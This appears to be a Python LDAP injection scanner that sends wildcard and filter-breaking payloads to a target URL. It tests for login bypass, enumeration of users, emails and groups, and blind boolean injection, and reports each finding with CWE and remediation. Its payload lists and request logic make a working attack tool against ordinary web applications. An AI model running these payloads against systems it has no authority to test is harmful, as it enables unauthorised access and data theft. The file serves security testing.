#!/usr/bin/env python3
"""
LDAP Injection Scanner
Tests for LDAP injection vulnerabilities in authentication and search operations
"""

import requests
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class LDAPInjectionScanner:
    """LDAP injection vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

    def scan(self):
        """Run LDAP injection tests"""
        print(f"[*] Starting LDAP injection testing on {self.target_url}")

        # Test authentication bypass
        self._test_authentication_bypass()

        # Test data exfiltration
        self._test_data_exfiltration()

        # Test blind LDAP injection
        self._test_blind_injection()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_authentication_bypass(self):
        """Test LDAP authentication bypass"""
        print("[*] Testing LDAP authentication bypass...")

        # Common authentication bypass payloads
        auth_bypass_payloads = [
            # OR bypass
            ('*', 'Wildcard bypass'),
            ('admin*', 'Partial wildcard'),
            ('*)(uid=*', 'OR injection'),
            ('*)(|(uid=*', 'Complex OR'),

            # Filter bypass
            ('admin)(&)', 'Filter bypass'),
            ('admin)(|(cn=*', 'OR with CN'),
            ('*)(objectClass=*', 'ObjectClass OR'),

            # NULL byte
            ('admin\x00', 'NULL byte'),

            # Comment bypass
            ('admin)#', 'Comment injection'),

            # Boolean bypass
            ('*)(&(uid=*', 'Boolean bypass'),
        ]

        # Test with username parameter
        for payload, description in auth_bypass_payloads:
            # Try as username with any password
            test_data = {
                'username': payload,
                'password': 'password'
            }

            try:
                response = self.session.post(self.target_url, data=test_data, timeout=10)

                # Check for successful authentication indicators
                success_indicators = [
                    'welcome',
                    'dashboard',
                    'logged in',
                    'success',
                    'redirect',
                    'location',
                ]

                for indicator in success_indicators:
                    if indicator in response.text.lower() or (response.status_code in [200, 302] and 'login' not in response.text.lower()):
                        vuln = {
                            'type': 'LDAP Injection - Authentication Bypass',
                            'severity': 'critical',
                            'url': self.target_url,
                            'payload': payload,
                            'description_type': description,
                            'evidence': f'Authentication bypass via {description}',
                            'description': f'LDAP injection allows authentication bypass using: {payload}',
                            'cwe': 'CWE-90',
                            'impact': 'Unauthorized access, authentication bypass',
                            'remediation': 'Use parameterized LDAP queries, input validation'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: LDAP auth bypass - {description}")
                        return

            except:
                pass

    def _test_data_exfiltration(self):
        """Test LDAP data exfiltration"""
        print("[*] Testing LDAP data exfiltration...")

        # Payloads for extracting data
        exfil_payloads = [
            # Extract all users
            ('*', 'All users wildcard'),
            ('a*', 'Users starting with a'),

            # Extract attributes
            ('admin)(mail=*', 'Extract email attribute'),
            ('*)(telephoneNumber=*', 'Extract phone numbers'),

            # Object class enumeration
            ('*)(objectClass=*', 'Enumerate all objects'),
            ('*)(objectClass=person', 'Enumerate persons'),
            ('*)(objectClass=user', 'Enumerate users'),
            ('*)(objectClass=group', 'Enumerate groups'),

            # CN enumeration
            ('*)(cn=*', 'Enumerate common names'),

            # UID enumeration
            ('*)(uid=*', 'Enumerate UIDs'),
        ]

        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        # Find search parameter
        search_params = ['search', 'query', 'q', 'username', 'user', 'name']
        target_param = None

        for param in search_params:
            if param in params:
                target_param = param
                break

        if not target_param and params:
            target_param = list(params.keys())[0]

        if not target_param:
            target_param = 'search'

        for payload, description in exfil_payloads:
            # Build test URL
            test_params = params.copy()
            test_params[target_param] = [payload]

            query_string = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

            try:
                response = self.session.get(test_url, timeout=10)

                # Check for data leakage indicators
                data_indicators = [
                    ('cn=', 'Common Name'),
                    ('uid=', 'User ID'),
                    ('mail=', 'Email address'),
                    ('telephoneNumber=', 'Phone number'),
                    ('objectClass=', 'Object class'),
                    ('distinguishedName', 'Distinguished name'),
                    ('memberOf=', 'Group membership'),
                ]

                for indicator, data_type in data_indicators:
                    if indicator in response.text:
                        # Count occurrences
                        count = response.text.count(indicator)

                        if count > 1:  # More than one result suggests data extraction
                            vuln = {
                                'type': 'LDAP Injection - Data Exfiltration',
                                'severity': 'high',
                                'url': test_url,
                                'payload': payload,
                                'parameter': target_param,
                                'evidence': f'{description} - Found {count} {data_type} entries',
                                'description': f'LDAP injection allows data extraction',
                                'cwe': 'CWE-90',
                                'impact': 'Sensitive data disclosure, user enumeration',
                                'remediation': 'Use parameterized queries, limit result sets'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] LDAP data exfiltration - {description}")
                            return

            except:
                pass

    def _test_blind_injection(self):
        """Test blind LDAP injection"""
        print("[*] Testing blind LDAP injection...")

        # Blind LDAP injection using boolean conditions
        # True condition
        true_payloads = [
            '*)(objectClass=*',
            'admin)(|(uid=*',
        ]

        # False condition
        false_payloads = [
            'nonexistent)(objectClass=nonexistent',
            'zzzzzzz)(|(uid=zzzzzzz',
        ]

        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        target_param = list(params.keys())[0] if params else 'username'

        try:
            # Get baseline response length
            baseline_response = self.session.get(self.target_url, timeout=10)
            baseline_length = len(baseline_response.content)

            # Test true conditions
            true_lengths = []
            for payload in true_payloads:
                test_params = params.copy()
                test_params[target_param] = [payload]

                query_string = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

                response = self.session.get(test_url, timeout=10)
                true_lengths.append(len(response.content))

            # Test false conditions
            false_lengths = []
            for payload in false_payloads:
                test_params = params.copy()
                test_params[target_param] = [payload]

                query_string = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

                response = self.session.get(test_url, timeout=10)
                false_lengths.append(len(response.content))

            # Check if there's a consistent difference
            avg_true = sum(true_lengths) / len(true_lengths)
            avg_false = sum(false_lengths) / len(false_lengths)

            if abs(avg_true - avg_false) > 100:  # Significant difference
                vuln = {
                    'type': 'Blind LDAP Injection',
                    'severity': 'high',
                    'url': self.target_url,
                    'parameter': target_param,
                    'evidence': f'Boolean-based blind LDAP injection detected (true avg: {avg_true}, false avg: {avg_false})',
                    'description': 'Application is vulnerable to blind LDAP injection',
                    'cwe': 'CWE-90',
                    'impact': 'Data extraction via boolean queries',
                    'remediation': 'Use parameterized queries, input validation'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Blind LDAP injection detected")

        except:
            pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 ldap_injection.py <url> [output_file]")
        print("\nExample:")
        print("  python3 ldap_injection.py https://example.com/login")
        print("  python3 ldap_injection.py 'https://example.com/search?username=test'")
        print("\nTests for:")
        print("  - Authentication bypass (wildcard, OR injection)")
        print("  - Data exfiltration (user enumeration, attribute extraction)")
        print("  - Blind LDAP injection (boolean-based)")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    scanner = LDAPInjectionScanner(target, output)
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
